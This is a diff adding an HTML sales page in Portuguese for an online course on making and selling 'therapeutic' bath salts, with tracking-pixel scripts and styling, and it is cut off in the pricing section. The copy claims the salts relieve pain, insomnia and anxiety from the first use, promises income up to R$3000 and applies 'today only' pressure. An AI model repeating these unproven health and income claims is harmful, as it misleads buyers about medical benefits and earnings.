@@ -1,0 +1,821 @@
+<!-- Topo do arquivo -->
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Essência Lucrativa</title>
+
+  <script>
+  window.pixelId = "68cf12022072cd925277e008";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  data-utmify-ignore-iframe
+  data-utmify-is-cartpanda
+  async
+  defer
+></script>
+
+ <!-- Descrição/SEO -->
+  <meta name="description" content="Crie sua própria linha de sais de banho terapêuticos com o Método Essência Lucrativa. Acesso imediato, preço de pré-lançamento e garantia de 7 dias.">
+
+    <!-- Open Graph -->
+  <meta property="og:title" content="Método Essência Lucrativa" />
+  <meta property="og:description" content="Transforme ingredientes naturais em sais terapêuticos irresistíveis que as clientes compram e recompram." />
+  <meta property="og:image" content="https://tusitio.com/og-hero.jpg" />
+  <meta property="og:type" content="website" />
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+
+  <!-- Preconnect para CDN de ícones -->
+  <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+
+  <!-- Font Awesome (ícones) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+  <!-- Preload das imagens críticas (hero bg e imagem hero) -->
+  <link rel="preload" as="image" href="images/teste.webp" fetchpriority="high">
+  <link rel="preload" as="image" href="images/Design-sem-nome-83.webp" fetchpriority="high">
+
+
+  <style>
+/* =========================
+   VARS (paleta + tokens)
+   ========================= */
+:root{
+  /* paleta */
+  --green:#1bb874; --green-dark:#0e9b60; --title:#177a6c;
+  --mint:#18a77b; --mint-ink:#0a5f4a;
+  /* superfícies */
+  --card:#ffffff; --bg:#f4faf7; --line:#e9eeec; --pill:#f7fbf9; --sand:#f6efe7;
+  /* texto */
+  --brown:#5a4638; --ink:#1c1d20; --muted:#6b6f76;
+  /* dimensões */
+  --bonus-header-h:44px;
+}
+
+/* =========================
+   BASE
+   ========================= */
+*{box-sizing:border-box}
+body{margin:0;font-family:Arial,Helvetica,sans-serif;color:var(--brown);background:#fff}
+
+/* =========================
+   PROMO BAR
+   ========================= */
+.promo-bar{
+  background:#e60000;color:#fff;text-align:center;
+  font-size:14px;font-weight:bold;padding:8px
+}
+
+/* =========================
+   HERO
+   ========================= */
+.hero{
+  position:relative;text-align:center;padding:40px 20px 0;color:#fff;
+  background:url(images/teste.webp) center/cover no-repeat;
+}
+.hero h1{font-size:20px;font-weight:700;line-height:1.4;margin:0 0 12px}
+.hero p{font-size:14px;line-height:1.5;max-width:600px;margin:0 auto 20px;color:#fff}
+.hero img{max-width:100%;border-radius:12px;display:block;margin:0 auto;box-shadow:0 6px 16px rgba(0,0,0,.25)}
+
+.hero h1,
+.hero p {
+  text-shadow: 
+    2px 2px 4px rgba(0, 0, 0, 0.6),   /* sombra principal mais escura */
+    0 0 8px rgba(0, 0, 0, 0.4);       /* brilho suave de fundo */
+
+}
+
+/* Curva (cor deve combinar com a próxima seção) */
+.curve{position:relative;height:60px;overflow:hidden;color:var(--bg)}
+.curve svg{display:block;width:100%;height:100%}
+.curve path{fill:currentColor}
+
+/* =========================
+   BENEFITS
+   ========================= */
+.benefits{background:var(--bg);padding:28px 16px 40px}
+.benefits__container{max-width:1100px;margin:0 auto}
+.benefits h2{ text-align:center;color:var(--title);font-size:18px;font-weight:800;letter-spacing:.2px;margin:0 0 8px }
+.benefits__divider{display:flex;gap:12px;justify-content:center;align-items:center;margin-bottom:20px}
+.benefits__divider span{display:block;width:50px;height:3px;border-radius:3px;background:#cfdad6}
+
+.benefits__list{list-style:none;padding:0;margin:0;display:grid;gap:12px}
+.benefits__item{
+  display:grid;grid-template-columns:auto 1fr;gap:12px;background:var(--card);
+  border-radius:12px;padding:12px 14px;box-shadow:0 6px 18px rgba(0,0,0,.06);align-items:start
+}
+.benefits__badge{
+  width:32px;height:32px;min-width:32px;border-radius:999px;
+  background:linear-gradient(180deg,var(--green),var(--green-dark));
+  color:#fff;font-weight:800;display:grid;place-items:center;box-shadow:0 2px 6px rgba(27,184,116,.35)
+}
+.benefits__item p{margin:2px 0 0;color:var(--brown);font-size:14px;line-height:1.55}
+.benefits__item p strong{font-weight:800}
+
+/* =========================
+   METHOD (banner + texto + ícones)
+   ========================= */
+.method{padding:24px 14px 36px}
+.method__container{max-width:1100px;margin:0 auto}
+.method__banner{margin:0 0 12px}
+.method__banner img{
+  width:100%;height:auto;display:block;border-radius:10px;
+  box-shadow:0 10px 28px rgba(0,0,0,.10);aspect-ratio:16/6;object-fit:cover
+}
+.method__kicker{margin:10px 0 10px;text-align:center;color:var(--mint-ink);font-size:16px;font-weight:800;letter-spacing:.3px;margin-top: 30px}
+.method__headline{margin:0 0 10px;text-align:center;line-height:1.35;color:var(--mint-ink);font-size:16px;font-weight:700}
+.method__headline b{color:var(--mint)}
+.method__text{color:var(--brown);font-size:14px;line-height:1.65;max-width:820px;margin:0 auto 18px;text-align:justify}
+.method__text b{color:#2b2f33}
+
+/* Cards com ícones (Font Awesome) */
+.cards-beneficios{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:20px}
+.card-beneficio{
+  background:#f7fbf9;border:1px solid #e0ece7;border-radius:14px;padding:16px 10px;text-align:center;
+  box-shadow:0 4px 12px rgba(0,0,0,0.05);transition:transform .2s ease, box-shadow .2s ease
+}
+.card-beneficio:hover{transform:translateY(-3px);box-shadow:0 8px 18px rgba(0,0,0,0.1)}
+.card-beneficio i{
+  display:inline-flex;align-items:center;justify-content:center;width:40px;height:40px;margin-bottom:8px;border-radius:50%;
+  background:#eaf7f2;color:#18a77b;font-size:18px
+}
+.card-beneficio p{font-size:14px;font-weight:600;color:#111;margin:0;line-height:1.4}
+
+/* =========================
+   VALUE (pilares + lista)
+   ========================= */
+.value{padding:22px 14px 34px;background:#fff}
+.value__container{max-width:1100px;margin:0 auto}
+.value__title{color:var(--mint-ink);font-weight:800;font-size:18px;line-height:1.3;margin:0 0 8px;text-align:left}
+.value__lead{color:var(--brown);font-size:14px;line-height:1.6;margin:0 0 14px;text-align:left}
+.value__lead b{color:#2b2f33}
+
+.value__pillars{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0 16px}
+.pillar{
+  background:var(--pill);border:1px solid var(--line);border-radius:12px;padding:14px 10px;text-align:center;
+  box-shadow:0 4px 12px rgba(0,0,0,.05);transition:transform .18s ease, box-shadow .18s ease
+}
+.pillar:hover{transform:translateY(-2px);box-shadow:0 8px 18px rgba(0,0,0,.08)}
+.pillar__icon{width:42px;height:42px;margin:0 auto 8px;border-radius:999px;background:#eaf7f2;display:grid;place-items:center;border:1px solid #d5efe5}
+.pillar__icon i{font-size:18px;color:var(--mint)}
+.pillar__title{font-size:13px;line-height:1.25;color:#111;margin:0}
+
+.value__subtitle{color:var(--mint-ink);font-size:16px;font-weight:800;margin:10px 0 8px;text-align:left}
+
+.value__list{counter-reset:item;list-style:none;padding:0;margin:0 0 12px;display:grid;gap:10px}
+.value__list li{
+  background:var(--card);border:1px solid var(--line);border-radius:12px;padding:12px 12px 12px 48px;color:var(--brown);
+  font-size:14px;line-height:1.55;position:relative;box-shadow:0 6px 18px rgba(0,0,0,.05)
+}
+.value__list li::before{
+  counter-increment:item;content:counter(item);position:absolute;left:12px;top:12px;width:26px;height:26px;border-radius:999px;
+  display:grid;place-items:center;background:linear-gradient(180deg,var(--mint),#0e9b60);color:#fff;font-weight:800;font-size:13px;
+  box-shadow:0 2px 6px rgba(24,167,123,.35)
+}
+.value__closing{color:var(--brown);font-size:14px;line-height:1.6;margin:8px 0 0}
+
+/* =========================
+   CATÁLOGO (círculos)
+   ========================= */
+.catalog{padding:18px 14px 28px;background:#fff}
+.catalog__container{max-width:1100px;margin:0 auto}
+.catalog__title{ text-align:center;color:var(--mint-ink);font-weight:800;font-size:16px;letter-spacing:.3px;margin:0 0 12px }
+.catalog__grid{display:grid;gap:18px 14px;grid-template-columns:1fr 1fr}
+.category{text-align:center}
+.category__title{color:var(--mint-ink);font-size:14px;font-weight:800;line-height:1.25;margin:0 0 10px}
+.category__thumb{
+  width:min(180px,80vw);aspect-ratio:1/1;margin:0 auto;border-radius:50%;overflow:hidden;background:#fff;
+  box-shadow:0 10px 22px rgba(0,0,0,.08);border:6px solid #fff
+}
+.category__thumb img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .25s ease}
+.category__thumb:hover img{transform:scale(1.03)}
+
+/* =========================
+   PRICING (com imagem)
+   ========================= */
+.pricing{padding:24px 14px 36px;background:linear-gradient(180deg,var(--mint-ink) 0%, var(--mint) 100%)}
+.pricing__container{max-width:1100px;margin:0 auto;text-align:center}
+.pricing__over{margin:0 0 4px;font-size:14px;color:#fff;font-weight:700}
+.pricing__title{margin:0 0 6px;color:#fff;font-size:18px;font-weight:900;letter-spacing:.3px}
+.pricing__lead{color:#fff;font-size:14px;line-height:1.55;max-width:820px;margin:0 auto 10px}
+.pricing__mockups{margin:8px auto 10px}
+.pricing__mockups img{width:min(920px,100%);height:auto;display:block;margin:0 auto;filter:drop-shadow(0 24px 40px rgba(0,0,0,.25))}
+.pricing__note{font-size:12px;color:#fff;margin:2px 0 14px;text-transform:uppercase;letter-spacing:.3px}
+
+.pricing__box{
+  background:#fff;border:1px solid #eee;border-radius:18px;padding:16px 12px;max-width:720px;margin:0 auto;
+  box-shadow:0 14px 36px rgba(0,0,0,.08)
+}
+.pricing__box--image{padding:12px}
+.price-image{margin:0 0 18px}
+.price-image img{width:100%;height:auto;display:block;border-radius:16px;box-shadow:0 14px 36px rgba(0,0,0,.12)}
+
+.btn-cta{
+  display:inline-block;width:100%;max-width:560px;background:linear-gradient(180deg,#2fd477,#1db765);
+  color:#0f0f0f;text-decoration:none;font-weight:900;text-transform:uppercase;font-size:16px;letter-spacing:.2px;
+  padding:16px 18px;border-radius:999px;box-shadow:0 10px 22px rgba(29,183,101,.4), inset 0 -4px 0 rgba(0,0,0,.08);
+  transition:transform .12s ease, box-shadow .12s ease;margin:6px 0;
+  animation:ctaPulse 1.8s ease-in-out infinite;transform-origin:center
+}
+.btn-cta:hover{transform:translateY(-2px);box-shadow:0 14px 28px rgba(29,183,101,.5), inset 0 -4px 0 rgba(0,0,0,.1)}
+.btn-cta:focus,.btn-cta:hover{animation-play-state:paused}
+@keyframes ctaPulse{
+  0%,100%{transform:scale(1);box-shadow:0 10px 22px rgba(29,183,101,.40), inset 0 -4px 0 rgba(0,0,0,.08)}
+  50%{transform:scale(1.04);box-shadow:0 16px 30px rgba(29,183,101,.55), inset 0 -5px 0 rgba(0,0,0,.10)}
+}
+@media (prefers-reduced-motion:reduce){ .btn-cta{animation:none} }
+
+.pricing__fine{margin:12px auto 8px;max-width:720px;font-size:11px;line-height:1.5;color:var(--brown)}
+.pricing__fine i{color:#18a77b;margin-right:5px}
+
+.pricing__logos{
+  display:grid;grid-template-columns:repeat(2,minmax(100px,1fr));
+  gap:12px;justify-items:center;align-items:center;margin-top:10px
+}
+.pricing__logos img{
+  height:28px;width:auto;background:#fff;border:1px solid #eee;border-radius:10px;padding:8px 10px;
+  box-shadow:0 6px 16px rgba(0,0,0,.06)
+}
+.pricing__conversion{margin:10px 0 0}
+.pricing__conversion img{width:100%;height:auto;display:block;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,.08)}
+
+/* =========================
+   BÔNUS (cards)
+   ========================= */
+.bonuses{background:var(--sand);padding:22px 14px 32px}
+.bonuses__container{max-width:1100px;margin:0 auto}
+.bonuses__headline{
+  margin:0 0 6px;text-align:center;color:var(--mint-ink);font-weight:900;font-size:16px;letter-spacing:.3px;text-transform:uppercase
+}
+.bonuses__sub{margin:0 0 14px;text-align:center;color:var(--brown);font-size:13px}
+.bonuses__grid{display:grid;gap:14px;grid-template-columns:1fr}
+
+.bonus{
+  position:relative;overflow:hidden;display:flex;flex-direction:column;align-items:center;text-align:center;
+  background:#fff;border:1px solid #e8ded2;border-radius:14px;padding:calc(14px + var(--bonus-header-h)) 12px 14px;
+  box-shadow:0 10px 22px rgba(0,0,0,.06);transition:transform .18s ease, box-shadow .18s ease
+}
+.bonus:hover{transform:translateY(-3px);box-shadow:0 14px 28px rgba(0,0,0,.08)}
+.bonus__ribbon{
+  position:absolute;top:0;left:0;right:0;height:var(--bonus-header-h);
+  border-radius:14px 14px 0 0;background:#6a4c3b;color:#fff;display:flex;align-items:center;justify-content:center;
+  font-size:12px;font-weight:800;letter-spacing:.3px;text-transform:uppercase;box-shadow:inset 0 -2px 0 rgba(0,0,0,.15)
+}
+.bonus__ribbon span{display:inline-flex;align-items:center;gap:6px}
+
+.bonus__cover{margin:0 auto 8px;width:min(220px,85%)}
+.bonus__cover img{width:100%;height:auto;display:block;border-radius:10px;box-shadow:0 8px 18px rgba(0,0,0,.08)}
+.bonus__title{margin:6px 0 6px;color:#1f2523;font-size:16px;font-weight:800;line-height:1.25}
+.bonus__text{margin:0 0 10px;color:var(--brown);font-size:13px;line-height:1.55}
+.bonus__cta{
+  display:inline-flex;align-items:center;justify-content:center;margin:10px auto 0;padding:10px 16px;border-radius:999px;
+  background:linear-gradient(180deg,#2fd477,#1db765);color:#0f0f0f;text-decoration:none;font-weight:900;font-size:13px;
+  box-shadow:0 8px 18px rgba(29,183,101,.35), inset 0 -3px 0 rgba(0,0,0,.08);letter-spacing:.2px;transition:transform .12s ease, box-shadow .12s ease
+}
+.bonus__cta:hover{transform:translateY(-1px);box-shadow:0 12px 22px rgba(29,183,101,.45), inset 0 -3px 0 rgba(0,0,0,.1)}
+
+/* =========================
+   FEEDBACKS (marquee suave)
+   ========================= */
+.reviews{ padding:24px 14px 34px; background:#fff; }
+.reviews__container{ max-width:1100px; margin:0 auto; }
+.reviews__title{
+  margin:0 0 6px; text-align:center; color:var(--mint-ink);
+  font-weight:900; font-size:18px; letter-spacing:.3px;
+}
+.reviews__lead{ margin:0 0 14px; text-align:center; color:var(--brown); font-size:13px; }
+
+.reviews-marquee{
+  position: relative; overflow: hidden;
+  -webkit-mask-image: linear-gradient(to right, transparent 0, #000 6%, #000 94%, transparent 100%);
+          mask-image: linear-gradient(to right, transparent 0, #000 6%, #000 94%, transparent 100%);
+}
+.reviews-marquee__track{
+  --reviews-speed: 24s;            /* diminua para acelerar */
+  --reviews-distance: 100%;        /* JS substitui por px exatos */
+  display:flex; gap:14px; align-items:stretch;
+  animation: reviewsScroll var(--reviews-speed) linear infinite;
+  will-change: transform;
+  pointer-events: none;
+}
+@keyframes reviewsScroll{
+  from { transform: translateX(0); }
+  to   { transform: translateX(calc(-1 * var(--reviews-distance))); }
+}
+.review{
+  flex:0 0 auto;
+  width: clamp(220px, 42vw, 320px);
+  background:#fff; border:1px solid var(--line); border-radius:16px;
+  box-shadow:0 10px 22px rgba(0,0,0,.06);
+  padding:10px; margin:0;
+}
+.review img{
+  width:100%; height:auto; display:block; border-radius:12px;
+  box-shadow:0 8px 18px rgba(0,0,0,.07);
+  user-select:none;
+}
+@media (prefers-reduced-motion: reduce){
+  .reviews-marquee__track{ animation: none; }
+}
+
+/* =========================
+   CERTIFICATE
+   ========================= */
+.certificate{ padding:24px 14px 34px; background:#fff; }
+.certificate__container{ max-width:1100px; margin:0 auto; display:grid; gap:16px; align-items:center; }
+.certificate__content{ text-align:center; }
+.certificate h2{ margin:0 0 8px; color:var(--mint-ink); font-size:18px; font-weight:900; letter-spacing:.2px; }
+.certificate p{ margin:0 0 10px; color:var(--brown); font-size:14px; line-height:1.65; }
+.certificate p strong{ color:#2b2f33; }
+.certificate__media img{
+  width:100%; height:auto; display:block; border-radius:14px; border:1px solid var(--line);
+  box-shadow:0 10px 22px rgba(0,0,0,.10); object-fit:cover; aspect-ratio: 16 / 9;
+}
+
+/* =========================
+   GARANTIA (selo lateral)
+   ========================= */
+.guarantee{ padding:24px 14px 34px; background:#fff; }
+.guarantee__container{ max-width:1100px; margin:0 auto; display:grid; gap:18px; align-items:center; }
+.guarantee__content{ text-align:center; }
+.guarantee h2{ margin:0 0 6px; color:var(--mint-ink); font-size:18px; font-weight:900; letter-spacing:.2px; text-transform:uppercase; }
+.guarantee h2 span{ color:#2b2f33; }
+.guarantee__subtitle{ margin:0 0 10px; color:var(--brown); font-size:14px; font-weight:800; }
+.guarantee__bullets{ margin:10px 0 0; padding-left:18px; color:var(--brown); font-size:14px; line-height:1.55; }
+.guarantee__media img{ width:100%; height:auto; display:block; }
+
+/* =========================
+   BREAKPOINTS
+   ========================= */
+@media (min-width:520px){
+  .pricing__logos{grid-template-columns:repeat(3,minmax(120px,1fr))}
+}
+@media (min-width:760px){
+  .bonuses__grid{grid-template-columns:repeat(2,1fr)}
+  /* garantia: texto | selo */
+  .guarantee__container{ grid-template-columns: 1.2fr .8fr; }
+  .guarantee__content{ text-align:left; }
+  .guarantee__media{ justify-self:end; }
+  .guarantee__media img{ width:min(420px,100%); }
+}
+@media (min-width:900px){
+  .method__headline{font-size:18px}
+  .cards-beneficios{grid-template-columns:repeat(4,1fr)}
+  .pricing__title{font-size:20px}
+  .catalog__title{font-size:18px}
+  .catalog__grid{grid-template-columns:repeat(3,1fr)}
+  .category__thumb{width:220px}
+  .pricing__logos{grid-template-columns:repeat(5,minmax(120px,1fr))}
+  .pricing__logos img{height:30px}
+}
+@media (min-width:980px){
+  .benefits h2{font-size:22px}
+  .benefits__list{grid-template-columns:1fr 1fr;gap:14px}
+  .benefits__item{padding:14px 16px}
+  .value__title{font-size:20px}
+  .value__lead{max-width:900px}
+  .value__pillars{grid-template-columns:repeat(4,1fr);gap:12px}
+  .value__list{grid-template-columns:1fr 1fr;gap:12px}
+  .certificate__container{ grid-template-columns: 1.05fr 1fr; gap:28px; }
+  .certificate__content{ text-align:left; }
+}
+
+/* ====== BANDS + CARDS (amarram visualmente as seções) ====== */
+.section-band{ background: var(--bg); padding: 28px 14px; }
+.section-band--sand{ background: var(--sand); }
+
+.section-card{
+  max-width:1100px; margin:0 auto;
+  background:#fff; border:1px solid var(--line); border-radius:16px;
+  box-shadow:0 12px 28px rgba(0,0,0,.06);
+  padding:18px 16px;
+}
+.section-card__header{ display:flex; align-items:center; gap:10px; margin:0 0 14px; }
+.section-card__header::before,
+.section-card__header::after{
+  content:""; flex:1; height:2px; border-radius:2px;
+  background:linear-gradient(90deg, transparent, #cfdad6);
+}
+.section-card__header .dot{
+  width:8px; height:8px; border-radius:50%;
+  background:var(--mint); box-shadow:0 0 0 4px rgba(24,167,123,.12);
+}
+.section-card .certificate,
+.section-card .guarantee{ padding:0; background:transparent; }
+
+/* garante o pulso em todos os CTAs */
+.btn-cta{ animation: ctaPulse 1.8s ease-in-out infinite !important; }
+  </style>
+</head>
+<body>
+
+  <!-- Barra de desconto -->
+  <div class="promo-bar">
+    ⚠️ ATENÇÃO: DESCONTO RELÂMPAGO + 5 BÔNUS EXCLUSIVOS DISPONÍVEIS SOMENTE HOJE
+  </div>
+
+  <!-- Hero -->
+  <section class="hero">
+    <h1>
+      Crie Sua Própria Linha de Sais de Banho Terapêuticos Exclusivos <br>
+      e lucre até <b>R$3000</b> sem sair de casa com o Método <b>ESSÊNCIA LUCRATIVA</b>
+    </h1>
+    <p>
+      Descubra como criar misturas funcionais com benefícios reais, reduza os custos de produção e transforme cada sal de banho em um produto irresistível que vende como água.
+    </p>
+    <img src="images/Design-sem-nome-83.webp" alt="Imagem principal do curso" fetchpriority="high">
+  </section>
+
+  <!-- Curva -->
+  <div class="curve">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 160" preserveAspectRatio="none">
+      <path d="M0,64 C480,160 960,0 1440,96 L1440,160 L0,160 Z"></path>
+    </svg>
+  </div>
+
+  <!-- BENEFÍCIOS -->
+  <section class="benefits" aria-labelledby="benefits-title">
+    <div class="benefits__container">
+      <h2 id="benefits-title">O QUE VOCÊ VAI CONSEGUIR COM O CURSO DIGITAL DO MÉTODO “ESSÊNCIA LUCRATIVA”</h2>
+      <div class="benefits__divider"><span></span><span></span></div>
+
+      <ol class="benefits__list">
+        <li class="benefits__item">
+          <div class="benefits__badge">1</div>
+          <p>
+            Ao finalizar o Curso, você não apenas aprenderá a fazer Sais de Banho. Você dominará a arte da
+            <strong>Formulação Terapêutica Natural</strong>. Vai descobrir como cada ingrediente impacta no
+            <strong>Corpo, Mente e Emoções</strong>, criando combinações com propósito que
+            <strong>Encantam</strong> seus clientes e multiplicam suas vendas.
+          </p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">2</div>
+          <p>Você criará sua <strong>Primeira Linha Artesanal</strong> sem se sentir perdida. Terá a
+            <strong>Clareza de um Passo a Passo</strong> concreto para criar <strong>Produtos Funcionais</strong> e atrativos do zero.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">3</div>
+          <p>Você receberá uma <strong>Lista Verificada de Fornecedores</strong> de insumos de
+            <strong>Qualidade e Bom Preço</strong> para não se preocupar em onde comprar tudo o que precisa para iniciar seu
+            <strong>Negócio de Sucesso</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">4</div>
+          <p>Vai oferecer produtos que seus <strong>Clientes Vão Querer Comprar Novamente</strong>. Graças às
+            <strong>Dezenas de fórmulas exclusivas</strong>, você poderá personalizar sua oferta e fidelizar com
+            <strong>Experiências Sensoriais Únicas</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">5</div>
+          <p>Você vai promover <strong>Benefícios Reais</strong> para aliviar dor muscular e articular, estresse, insônia e ansiedade,
+            cansaço mental, pele seca e desidratada. Benefícios que seus clientes sentirão <strong>Desde o Primeiro Uso</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">6</div>
+          <p>Vai reduzir desperdícios e erros de produção graças às <strong>Técnicas de Otimização</strong>, economizando dinheiro e matéria-prima, <strong>Maximizando seus Lucros</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">7</div>
+          <p>Terá uma <strong>Apresentação Profissional</strong> sem investir em máquinas caras. Vai descobrir como
+            <strong>Embalhar seus Produtos</strong> para se destacar em feiras, lojas ou redes sociais
+            <strong>Desde o Primeiro Dia</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">8</div>
+          <p>Vai aprender a <strong>Se Diferenciar</strong> com uma <strong>Proposta Clara e Funcional</strong>. Você não competirá por preço,
+            competirá por <strong>Valor Real</strong>. Porque seus sais não serão qualquer mistura: serão
+            <strong>Terapias em um Frasco</strong>.</p>
+        </li>
+        <li class="benefits__item">
+          <div class="benefits__badge">9</div>
+          <p>E o melhor: <strong>sem necessidade de maquinários caros</strong>, sem experiência prévia, nem cursos técnicos longos.</p>
+        </li>
+      </ol>
+    </div>
+  </section>
+
+<!-- MÉTODO -->
+<section class="method" aria-labelledby="method-title">
+  <div class="method__container">
+    <figure class="method__banner">
+      <img src="images/Design-sem-nome-84.webp" alt="Colagem com três cenas do método Essência Lucrativa" loading="lazy" width="1440" height="560">
+    </figure>
+
+    <h3 id="method-title" class="method__kicker">“MÉTODO ESSÊNCIA LUCRATIVA™”</h3>
+    <h2 class="method__headline">
+      Converta Ingredientes Naturais em uma Linha de <b>Sais Terapêuticos Irresistíveis</b>
+      que <b>Fidelizam Clientes</b> e te Posicionam como uma <b>Marca com Propósito</b>
+    </h2>
+
+    <p class="method__text">
+      Tudo começou em um momento de crise. Eu estava esgotada emocional e financeiramente.
+      A rotina, o estresse, a falta de tempo e a necessidade de <b>gerar renda em casa</b> me levaram a buscar algo a mais…
+      Um dia, entre receitas caseiras e técnicas naturais, encontrei uma <b>Fórmula Simples</b> para criar Sais de Banho.
+      Testei. Presenteei. E algo incrível aconteceu: <b>Todos Queriam Mais</b> — pediam novos aromas, mais propriedades,
+      queriam comprar. Foi aí que entendi: eu tinha algo <b>Poderoso nas minhas Mãos</b>.
+    </p>
+
+    <p class="method__text">
+      Aprofundei meus estudos: formei-me em <b>Aromaterapia</b>, aprendi princípios de
+      <b>Formulação Artesanal</b> e comecei a testar <b>Combinações Eficazes</b> para aliviar
+      desconfortos comuns como:
+    </p>
+
+    <div class="cards-beneficios">
+      <div class="card-beneficio"><i class="fas fa-dumbbell"></i><p>Dor muscular e articular</p></div>
+      <div class="card-beneficio"><i class="fas fa-brain"></i><p>Estresse, insônia e ansiedade</p></div>
+      <div class="card-beneficio"><i class="fas fa-bolt"></i><p>Cansaço mental</p></div>
+      <div class="card-beneficio"><i class="fas fa-tint"></i><p>Pele seca e desidratada</p></div>
+    </div>
+  </div>
+</section>
+
+
+<!-- VALOR -->
+<section class="value" aria-labelledby="value-title">
+  <div class="value__container">
+    <h2 id="value-title" class="value__title">Mas Não Bastava Fazer “um Sal com Cheiro Bom”</h2>
+
+    <p class="value__lead">
+      O mercado artesanal está saturado de produtos bonitos, mas <b>sem resultados</b>.
+      Por isso desenvolvi o <b>MÉTODO ESSÊNCIA LUCRATIVA™</b> — um sistema para
+      <b>Criar uma Linha Autêntica de Sais Terapêuticos</b> que suas clientes
+      <b>Amarão</b>, <b>Lembrarão</b>… e <b>Voltarão a Comprar</b>.
+    </p>
+
+    <div class="value__pillars">
+      <article class="pillar">
+        <div class="pillar__icon"><i class="fas fa-seedling"></i></div>
+        <h3 class="pillar__title">Propriedades Reais dos Ingredientes</h3>
+      </article>
+
+      <article class="pillar">
+        <div class="pillar__icon"><i class="fas fa-flask"></i></div>
+        <h3 class="pillar__title">Formulação Consciente</h3>
+      </article>
+
+      <article class="pillar">
+        <div class="pillar__icon"><i class="fas fa-award"></i></div>
+        <h3 class="pillar__title">Apresentação Atraente</h3>
+      </article>
+
+      <article class="pillar">
+        <div class="pillar__icon"><i class="fas fa-hand-holding-heart"></i></div>
+        <h3 class="pillar__title">Enfoque Emocional de Venda</h3>
+      </article>
+    </div>
+
+    <h3 class="value__subtitle">Em vez de perder tempo com receitas soltas, aqui você obtém:</h3>
+    <ol class="value__list">
+      <li><b>Combinações comprovadas</b> para aliviar dores comuns (dor muscular/articular, estresse/insônia/ansiedade, cansaço mental, pele seca)…</li>
+      <li><b>Passo a passo simples</b> para criar fórmulas funcionais que realmente entregam benefício…</li>
+      <li><b>Guia prático de apresentação e embalagem</b> para aumentar o valor percebido e encantar…</li>
+      <li><b>Estratégias de posicionamento emocional</b> que geram fidelização e recompra…</li>
+      <li>E o melhor: <b>sem maquinários caros nem experiência prévia</b>…</li>
+    </ol>
+
+    <p class="value__closing">
+      Este método te permite avançar <b>Sem Travar</b>, com <b>Clareza</b> e com uma
+      <b>Estrutura Comprovada</b>.
+    </p>
+  </div>
+</section>
+
+
+  <!-- CATÁLOGO -->
+  <section class="catalog" aria-labelledby="catalog-title">
+    <div class="catalog__container">
+      <h2 id="catalog-title" class="catalog__title">AQUI A GENTE TE ENSINA TUDO!</h2>
+
+      <div class="catalog__grid">
+        <article class="category">
+          <h4 class="category__title">Receitas para Alívio da Dor Muscular e Articular</h4>
+          <figure class="category__thumb"><img src="images/Design-sem-nome-85.webp" alt="Sais terapêuticos para aliviar dor muscular e articular" loading="lazy"></figure>
+        </article>
+
+        <article class="category">
+          <h4 class="category__title">Receitas para Redução do Estresse e da Ansiedade</h4>
+          <figure class="category__thumb"><img src="images/image-2.webp" alt="Sais para reduzir estresse e ansiedade" loading="lazy"></figure>
+        </article>
+
+        <article class="category">
+          <h4 class="category__title">Receitas para Dormir Melhor e Combater a Insônia</h4>
+          <figure class="category__thumb"><img src="images/piel.webp" alt="Sais para dormir melhor e combater a insônia" loading="lazy"></figure>
+        </article>
+
+        <article class="category">
+          <h4 class="category__title">Receitas para Hidratação e Cuidado da Pele</h4>
+          <figure class="category__thumb"><img src="images/Design-sem-nome-87.webp" alt="Sais hidratantes para o cuidado da pele" loading="lazy"></figure>
+        </article>
+
+        <article class="category">
+          <h4 class="category__title">Receitas para Melhorar a Concentração e Clareza Mental</h4>
+          <figure class="category__thumb"><img src="images/Vinheta-Recetas-para-Dormir-320x320 (1).webp" alt="Sais para concentração e clareza mental" loading="lazy"></figure>
+        </article>
+
+        <article class="category">
+          <h4 class="category__title">Receitas para Recuperação Pós-Treino</h4>
+          <figure class="category__thumb"><img src="images/Vinheta-5-Tratamento-para-os-p-s.webp" alt="Sais para recuperação pós-treino" loading="lazy"></figure>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- PREÇO / OFERTA (ÂNCORA DO CHECKOUT) -->
+  <section class="pricing" id="checkout" aria-labelledby="pricing-title">
+    <div class="pricing__container">
+      <p class="pricing__over">Quanto Vale Para Você Tudo Isso?</p>
+      <h2 id="pricing-title" class="pricing__title">VOU CELEBRAR O PRÉ-LANÇAMENTO DO MEU CURSO COM VOCÊ</h2>
+      <p class="pricing__lead">Você poderá acessar o Curso Completo… por um super preço de pré-lançamento.</p>
+
+      <figure class="pricing__mockups">
+        <img src="images/Design-sem-nome-90.webp" alt="Pacote do curso Essência Rentável com eBooks, guias e materiais" loading="lazy">
+      </figure>
+
+      <div class="pricing__box pricing__box--image">
+        <figure class="price-image">
+          <img src="images/19,90.webp" alt="Preço relâmpago de pré-lançamento: $9.90 dólares. Pagamento único para as primeiras inscritas." width="960" height="720" loading="eager">
+        </figure>
+
